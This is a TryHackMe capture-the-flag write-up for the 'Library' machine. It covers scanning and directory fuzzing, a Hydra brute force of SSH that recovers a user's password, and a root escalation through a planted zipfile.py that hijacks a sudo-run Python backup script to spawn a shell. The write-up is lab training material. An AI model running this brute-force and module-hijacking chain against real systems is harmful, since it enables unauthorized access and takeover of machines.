# 🚩 TryHackMe: Write-up--Library — Full-Pwn Walkthrough By Mohammed-Ali
boot2root machine for FIT and bsides guatemala CTF

<img width="1584" height="654" alt="1" src="https://github.com/user-attachments/assets/a61f16f2-eab3-44f0-bade-02c38971191d" />

## 🛠️ Phase 1: Reconnaissance & Enumeration
The engagement started with an infrastructure scan to map out the attack surface and identify running services on the target IP (`ip[machine]`).
### 1. Service Discovery (Nmap Scan)
An aggressive Nmap scan was conducted to enumerate ports and service versions:
```
nmap [ip_machine] -sC -sV -Pn --open -T4
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 14:18 -0400
Nmap scan report for 
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```
<img width="1247" height="489" alt="2" src="https://github.com/user-attachments/assets/5df29672-39fb-4ff7-9c6a-179dce5fd3f0" />

Findings: Port 22 (SSH) and Port 80 (HTTP) were identified as open.

Now you should open the web page machine and anlysis the source code or the orignal page so when i opened it i looked for 
```

This is the title of a blog post

Posted on June 29th 2009 by meliodas - 3 comments
```
its like name so i write ir on new file 
### 2. Web Directory Fuzzing (Gobuster)
To uncover hidden application pathways and identify potentially exposed administrative or backup endpoints, active directory fuzzing was initiated using **Gobuster** with the standard `common.txt` wordlist:

```bash
gobuster dir -u [http://[ip_machine]/] -w /usr/share/wordlists/dirb/common.txt
```
the result is 
```
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ip_machine 
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/rootforce/Desktop/all/cyber_security/SecLists-master/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 297]
.hta                 (Status: 403) [Size: 292]
.htpasswd            (Status: 403) [Size: 297]
images               (Status: 301) [Size: 315] [--> http://10.112.190.60/images/]
index.html           (Status: 200) [Size: 5439]
robots.txt           (Status: 200) [Size: 33]
server-status        (Status: 403) [Size: 301]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
now i opened the robots.txt   maybe contain directory or any hints 

<img width="783" height="215" alt="4" src="https://github.com/user-attachments/assets/90a0be7e-6b6f-4efb-a9c6-c06b148fb257" />

its say rockyou so itried use brute force on ssh maybe the user name i got it its work 

### Initial Access (SSH Brute Forcing via Hydra)
i used hydra to brute force 
important for info for this tool 
-l >> uses if you have the user name 
-L >> if you dont have the user name 
-p >> if you have the password 
-p >> if you dont have passwd 

```
hydra -l  meliodas  -P /home/rootforce/Desktop/all/cyber_security/SecLists-master/rockyou.txt  ssh://10.112.190.60/22 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 14:21:15
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.112.190.60:22/22
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 14344298 to do in 2390:43h, 4 active
[22][ssh] host: 10.112.190.60   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-15 14:24:02
```

Discovered Credentials: meliodas : iloveyou1

Establishing Connection

Using the cracked credentials, a secure shell session was successfully established:

```
 sshpass -p "iloveyou1" ssh meliodas@your_ip                                                         729ms
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Fri May 15 11:32:35 2026 from 
meliodas@ubuntu:~$
```
Result: Successfully spawned a stable user shell session (meliodas@ubuntu:~$) and retrieved the initial flag (user.txt).

Phase 3: Privilege Escalation
1 - Sudo Rights Enumeration
```
meliodas@ubuntu:~$ sudo -l
```
the result is 
```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
2. Script Analysis (cat bak.py)

Inspecting the content of the target backup script revealed the following logic:
```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```
Vulnerability: The script imports the standard library zipfile. Because the script is executed out of the user's home directory (/home/meliodas), Python looks for imported modules locally before querying system libraries.

3. Exploitation via Python Library Hijacking

Since the execution path prioritizes the current working directory, a malicious library script named zipfile.py was injected into /home/meliodas/:

``` python
import os 
os.system("/bin/bash")
```
Now, triggering the backup routine with sudo invokes our hijacked library version instead of the official system module, causing the system to open a root-level terminal:
```bash
sudo /usr/bin/python3 /home/meliodas/bak.py
```
<img width="964" height="272" alt="5" src="https://github.com/user-attachments/assets/21f510f8-a3b8-4c2e-ac5a-17692365316a" />



Final Outcome: Fully compromised the instance and spawned a persistent root@ubuntu:# shell session to retrieve the final system proof (root.txt).

### About the Author

Mohammed Ali Cybersecurity student focused on penetration testing and Digital Forensics.
accounts on insta

Instagram : https://www.instagram.com/e6ecx/
THM : https://tryhackme.com/p/eng.mohammed.ali.abd

Follow My Journey
I regularly share write-ups and my cybersecurity journey. More content coming soon


### 🛡️ Disclaimer

This writeup is strictly created for educational, ethical hacking research, and professional training purposes within legally authorized lab environments hosted by TryHackMe. All steps were performed against an isolated simulation target.
